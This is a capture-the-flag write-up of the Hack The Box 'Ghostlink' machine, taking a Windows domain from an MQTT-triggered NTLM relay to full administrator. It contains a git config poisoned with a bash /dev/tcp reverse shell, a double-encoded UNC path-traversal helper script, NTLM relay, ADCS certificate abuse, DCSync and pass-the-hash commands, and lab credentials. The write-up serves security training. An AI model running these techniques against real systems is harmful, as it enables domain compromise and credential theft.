---
title: Fullpwn - Ghostlink - HTB Business CTF 2026 Project Nightfall
date: "2026-05-20"
excerpt: Writeup of the box Ghostlink from HTB business CTF 2026
tags:
  - fullpwn
  - web
  - windows
  - active-directory
author: Ap4sh
---

## Overview

Ghostlink was the fullpwn box from Hack The Box Business 2026,

It had a pretty long but clean chain:

```text
MQTT write -> NTLM coercion -> GhostSurf relay -> authenticated LFI
-> NTUSER.DAT RecentDocs -> KeePass creds -> Gogs CVE-2025-8110 RCE
-> Gogs DB hash -> nvirelli -> ADCS relay -> DC01$ certificate
-> DCSync Administrator -> root.txt
```

The most annoying part was not getting the LFI itself. It was figuring out what to read with it. The actual useful file was not a config, not a DLL, not PowerShell history, but the user registry hive of the service account.

---

## 1. Initial Recon

The target was a Windows domain controller:

```text
10.129.1.188  dc01.ghostlink.htb ghostlink.htb
```

The interesting exposed ports were:

```text
53/tcp    domain
80/tcp    http
88/tcp    kerberos
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   smb
464/tcp   kpasswd
593/tcp   http-rpc-epmap
1883/tcp  mqtt
2179/tcp  vmrdp
3268/tcp  global catalog ldap
3269/tcp  global catalog ldaps
5985/tcp  winrm
```

The weird port here is obviously MQTT. Subscribing to everything showed a lot of healthcheck telemetry:

```bash
mosquitto_sub -h 10.129.1.188 -t "#" -v
```

Some useful messages:

```json
GhostProtocolZero/systems/node/repository/healthcheck {
  "node": "node-5",
  "telemetry": {
    "healthy": true,
    "url": "gpz-op26-toolkits.ghostlink.htb/healthcheck",
    "responseCode": "200",
    "ip": "172.16.20.20"
  }
}
```
```json
GhostProtocolZero/systems/node/secureshare/healthcheck {
  "node": "node-6",
  "telemetry": {
    "healthy": true,
    "url": "gpz-op26-secure.ghostlink.htb/healthcheck",
    "responseCode": "200",
    "ip": "172.16.20.10"
  }
}
```

So we had at least:

```text
gpz-op26-toolkits.ghostlink.htb -> Gogs, internal IP 172.16.20.20
gpz-op26-secure.ghostlink.htb   -> Secure file app, internal IP 172.16.20.10
dc01.ghostlink.htb              -> Domain controller
```

---

## 2. MQTT to NTLM Coercion

The MQTT healthcheck topics accepted modified payloads. If we replaced the `telemetry.url` with an attacker-controlled URL, the backend would later check it.

Payload shape:

```json
{
  "timestamp": "2026-15-05-16:45:00",
  "node": "node-6",
  "telemetry": {
    "healthy": true,
    "url": "http://10.10.14.155:8000/secure",
    "lastCheckSecAgo": 0,
    "responseCode": "200",
    "ip": "172.16.20.10"
  }
}
```

Publishing that to the healthcheck topics caused a callback to our machine. The callback authenticated with NTLM as:

```text
GHOSTLINK\svc_canary
```

At first this only looked like a NetNTLMv2 capture, and the hash was not useful. The right idea was to relay the HTTP authentication to the internal secure app.

Classic `ntlmrelayx` HTTP SOCKS was painful here, so we used GhostSurf. It gave us a usable authenticated browser-like session against:

```text
http://gpz-op26-secure.ghostlink.htb/
```

The important point is:

```text
MQTT did not directly give credentials.
MQTT gave us a reliable NTLM coercion primitive as svc_canary.
```

---

## 3. The Secure App LFI

The internal secure app exposed a download endpoint:

```text
/api/download/{hash}
```

It was protected by Windows authentication, so it was not usable before the relay. Once we had the GhostSurf session, this endpoint became the main bug.

The decompiled .NET code was basically:

```csharp
string text = HttpUtility.UrlDecode(hash);
string path2 = Path.Combine(uploadsPath, text);
FileStream fileStream = File.OpenRead(path2);
return Results.File(fileStream, "application/octet-stream", text + ".enc");
```

There are two bugs here:

1. `hash` is decoded manually.
2. The decoded value is used in `Path.Combine()` without checking that the final path stays inside `uploads`.

Because IIS handled the first decoding layer and the app decoded again, we used double-encoded separators:

```text
/api/download/..%252fappsettings.json
```

After the app's `UrlDecode()`, this becomes:

```text
../appsettings.json
```

That was enough to read files relative to the app content root:

```text
../appsettings.json
../web.config
../GhostProtocolZero.dll
../GhostProtocolZero.deps.json
../gpz-op26-pubkey.pem
../gpz-op26-privkey.pem
```

`web.config` also confirmed that double escaping was explicitly enabled:

```xml
<requestFiltering allowDoubleEscaping="true" />
```

So the traversal was not a random parsing accident; the target was configured in a way that made the double-encoding route stable.

---

## 4. Why UNC Paths Matter

At this point we had a file read, but reading random app files was not enough. We pulled the DLL, configs, private RSA key, etc. They were useful for understanding the app, but they did not give a direct user.

The key detail is that the backend is Windows.

On Windows, `Path.Combine(basePath, userInput)` is also unsafe when `userInput` is an absolute path. For example:

```text
C:\Windows\win.ini
```

will ignore the original upload directory.

Even better, UNC paths also work:

```text
\\127.0.0.1\C$\Windows\win.ini
```

Double-encoded for the vulnerable endpoint:

```text
/api/download/%255c%255c127.0.0.1%255cC$%255cWindows%255cwin.ini
```

After decoding:

```text
\\127.0.0.1\C$\Windows\win.ini
```

This made the secure host read from its own local admin share. That was the real unlock. We were not just escaping `uploads` anymore; we could target the backend's `C$`.

We confirmed the backend identity with:

```text
\\127.0.0.1\C$\Windows\Debug\NetSetup.log
```

It identified the machine as:

```text
GPZ-OP26-SECURE
```

and showed it was joined to:

```text
ghostlink.htb
```

---

## 5. Reading the Right User Artifact

The service account involved in the relay was:

```text
svc_canary
```

So we started looking into:

```text
C:\Users\svc_canary\
```

PowerShell history existed but was useless:

```text
C:\Users\svc_canary\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

It only had a few useless commands, so it mostly confirmed that we were looking at the right profile but the wrong artifact.

```text
cmd, exit
```

The useful artifact was the user's registry hive:

```text
\\127.0.0.1\C$\Users\svc_canary\NTUSER.DAT
```

Encoded for the LFI:

```text
/api/download/%255c%255c127.0.0.1%255cC$%255cUsers%255csvc_canary%255cNTUSER.DAT
```

Dumping the hive locally showed RecentDocs/MRU traces. In particular, the `.zip` RecentDocs key pointed to:

```text
C:\Users\svc_canary\Documents\Operations\Management\db.zip
```

This was the big "ok now we are moving" moment. We did not guess the ZIP path. `NTUSER.DAT` leaked it.

We pulled the ZIP with the same UNC LFI:

```text
\\127.0.0.1\C$\Users\svc_canary\Documents\Operations\Management\db.zip
```

The ZIP contained:

```text
db.kdbx
.key.keyx
```

The KeePass database opened with the keyfile alone and gave us:

```text
vroth / mOo03jpsqx8JQYMBwvFP
```

These creds worked on the Gogs instance:

```text
http://gpz-op26-toolkits.ghostlink.htb/
```

---

## 6. Gogs RCE

The Gogs instance matched:

```text
Gogs v0.13.3
```

This version is vulnerable to CVE-2025-8110, a symlink/path handling bug in the repository contents API.

The short version:

1. Create a repo as `vroth`.
2. Commit a symlink inside the repo.
3. Point the symlink to `.git/config`.
4. Use the API to overwrite the symlink path.
5. Gogs follows the symlink and writes into `.git/config`.
6. Poison `core.sshCommand`.
7. Trigger a Git operation that uses SSH.
8. Get code execution as the `git` user.

The poisoned `.git/config` looked like:

```ini
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.14.155/4444 0>&1' #
[remote "origin"]
	url = git@localhost:vroth/repo.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

After triggering the vulnerable path, we got a shell:

```text
git@gpz-op26-toolkits
```

This was not enough to read `user.txt`, but it gave us access to local Gogs data.

---

## 7. From Gogs DB to User

The user flag was here:

```text
/home/nvirelli/user.txt
```

but it was not readable as `git`:

```text
-rw-r----- root nvirelli /home/nvirelli/user.txt
```

From the Gogs database, we recovered the users and password hashes. The useful user was:

```text
nvirelli
```

The cracked password was:

```text
u47YUclrDiwWxBheaSzI
```

It worked locally:

```bash
su - nvirelli
```

and gave us the first flag in the home directory :)

It also worked against the domain:

```text
GHOSTLINK\nvirelli : u47YUclrDiwWxBheaSzI
```

So now we finally had a real AD user.

---

## 8. AD Enumeration

With `nvirelli`, SMB and LDAP worked:

```bash
nxc smb 10.129.1.188 -d ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --shares
```

Shares were standard:

```text
IPC$       READ
NETLOGON   READ
SYSVOL     READ
```

The useful AD object list was:

```text
Administrator
krbtgt
nvirelli
kdraven
zkovacs
ohexley
vroth
dsoren
lnoctis
svc_canary
```

BloodHound did not show a quick ACL path from `nvirelli`. The interesting thing was ADCS.

Certipy showed:

```text
CA Name : ghostlink-GPZ-OP26-SECURE-CA
DNS     : gpz-op26-secure.ghostlink.htb
HTTP Web Enrollment : Enabled
HTTPS Web Enrollment: Disabled
```

and flagged:

```text
ESC8: Web Enrollment is enabled over HTTP.
```

The CA lived on the internal host:

```text
172.16.20.10
```

So we needed a pivot through the Linux Gogs box.

---

## 9. Pivoting to the CA

From the `nvirelli` shell on `gpz-op26-toolkits`, we ran a reverse Chisel tunnel.

The important local forwards were:

```text
127.0.0.1:1081  -> SOCKS through gpz-op26-toolkits
127.0.0.1:10445 -> 172.16.20.10:445
127.0.0.1:10135 -> 172.16.20.10:135
127.0.0.1:18080 -> 172.16.20.10:80
```

Then we exposed local privileged ports to tools that expect port 445/135:

```bash
sudo socat TCP-LISTEN:445,bind=127.0.0.1,fork,reuseaddr TCP:127.0.0.1:10445
sudo socat TCP-LISTEN:135,bind=127.0.0.1,fork,reuseaddr TCP:127.0.0.1:10135
```

At this point, local `127.0.0.1:445` was effectively the CA server's SMB named pipe endpoint.

---

## 10. ADCS Relay to DC01$

The web enrollment side was enabled, but the classic HTTP endpoint was annoying in practice. The reliable route was to relay to the RPC/ICPR interface over SMB named pipe.

We started `ntlmrelayx` in ICPR mode:

```bash
sudo ntlmrelayx.py \
  -ip 10.10.14.155 \
  -t rpc://127.0.0.1 \
  -rpc-mode ICPR \
  -rpc-use-smb \
  -auth-smb 'ghostlink/nvirelli:u47YUclrDiwWxBheaSzI' \
  -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' \
  --template DomainController \
  -l relay_icpr_dc_smb \
  --no-http-server --no-wcf-server --no-raw-server \
  -debug
```

Then we coerced the DC to authenticate to us:

```bash
coercer coerce \
  -u nvirelli \
  -p 'u47YUclrDiwWxBheaSzI' \
  -d ghostlink.htb \
  --dc-ip 10.129.1.188 \
  -t 10.129.1.188 \
  -l 10.10.14.155 \
  --auth-type smb \
  --always-continue \
  --delay 1
```

`MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx` produced an auth from:

```text
GHOSTLINK\DC01$
```

`ntlmrelayx` relayed it to the CA RPC endpoint and requested a Domain Controller certificate:

```text
Authenticating connection from GHOSTLINK/DC01$@10.129.1.188 against rpc://127.0.0.1 SUCCEED
Generating a CSR for user DC01$ and template DomainController
Successfully requested certificate
Writing PKCS#12 certificate to relay_icpr_dc_smb/DC01.pfx
```

Now we had:

```text
relay_icpr_dc_smb/DC01.pfx
```

---

## 11. DC Certificate to Administrator Hash

Kerberos initially failed because our clock was off:

```text
KRB_AP_ERR_SKEW(Clock skew too great)
```

So we synced time with the DC:

```bash
sudo ntpdate -u 10.129.1.188
```

Then authenticated with the DC certificate:

```bash
certipy auth \
  -pfx relay_icpr_dc_smb/DC01.pfx \
  -dc-ip 10.129.1.188 \
  -domain ghostlink.htb \
  -username 'DC01$'
```

Certipy returned a TGT and the machine account NT hash:

```text
dc01$ : 6be9286fbebb8e2339d816062287b231
```

Using the DC machine account, we performed a targeted DCSync for Administrator:

```bash
secretsdump.py \
  -hashes ':6be9286fbebb8e2339d816062287b231' \
  -just-dc-user Administrator \
  ghostlink.htb/'DC01$'@10.129.1.188
```

This gave:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002ddd63eb209b016696:::
```

---

## 12. Root

The Administrator hash worked over SMB:

```bash
nxc smb 10.129.1.188 \
  -d ghostlink.htb \
  -u Administrator \
  -H '8190e067f478002ddd63eb209b016696' \
  --shares
```

Result:

```text
ghostlink.htb\Administrator:8190e067f478002ddd63eb209b016696 (Pwn3d!)
C$ READ,WRITE
ADMIN$ READ,WRITE
```

Then we can now read the flag :) 

---

## Final Chain

```text
1. Subscribe to MQTT and find writable healthcheck topics.
2. Inject our URL into healthcheck telemetry.
3. Receive NTLM auth from GHOSTLINK\svc_canary.
4. Relay it with GhostSurf to gpz-op26-secure.
5. Exploit /api/download/{hash} LFI with double-encoded traversal.
6. Use Windows UNC loopback \\127.0.0.1\C$ to read backend files.
7. Pull C:\Users\svc_canary\NTUSER.DAT.
8. Parse RecentDocs/MRU and find Documents\Operations\Management\db.zip.
9. Pull db.zip, open KeePass with the bundled keyfile, recover vroth creds.
10. Exploit Gogs CVE-2025-8110 for RCE as git.
11. Dump Gogs DB, crack nvirelli password, su to nvirelli, read user.txt.
12. Use nvirelli for AD enum; identify ADCS on gpz-op26-secure.
13. Pivot with Chisel to the CA internal ports.
14. Coerce DC01$ and relay to ADCS RPC/ICPR with DomainController template.
15. Use DC01.pfx to get DC01$ hash/TGT.
16. DCSync Administrator.
17. Pass-the-hash to SMB and read root.txt.
```

---

## Small Helper Scripts

### LFI pull helper

This assumes you already have a GhostSurf SOCKS session on `127.0.0.1:1080`.

No browser headers here, this is the cleaned-up final helper.

```python
import sys
import urllib.parse

import requests

base = "http://gpz-op26-secure.ghostlink.htb/api/download/"
proxy = "socks5h://127.0.0.1:1080"

path = sys.argv[1]
out = sys.argv[2]

once = urllib.parse.quote(path, safe="").replace(".", "%2E")
twice = urllib.parse.quote(once, safe="")

r = requests.get(base + twice, proxies={"http": proxy, "https": proxy}, verify=False)
print(r.status_code, len(r.content))

open(out, "wb").write(r.content)
```


`python3 lfi_pull.py '\\127.0.0.1\C$\Users\svc_canary\NTUSER.DAT' NTUSER.DAT`

`python3 lfi_pull.py '\\127.0.0.1\C$\Users\svc_canary\Documents\Operations\Management\db.zip' db.zip`

### RecentDocs quick check

If you do not want to fight with a full registry parser first, even a quick UTF-16 strings pass is enough to spot the lead:

```bash
strings -el NTUSER.DAT | grep -iE 'zip|kdbx|documents|operations|management'
```

Cleaner way:

```bash
regipy-dump NTUSER.DAT > ntuser.json
grep -iE 'zip|kdbx|documents|operations|management' ntuser.json
```

### Final root retrieval

Once the Administrator hash is recovered:

```bash
smbclient.py -hashes ':8190e067f478002ddd63eb209b016696' ghostlink.htb/Administrator@10.129.1.188 -no-pass
# then: C$ -> Users\Administrator\Desktop\root.txt
```


---

Much love ≡ƒÆï

Ap4sh
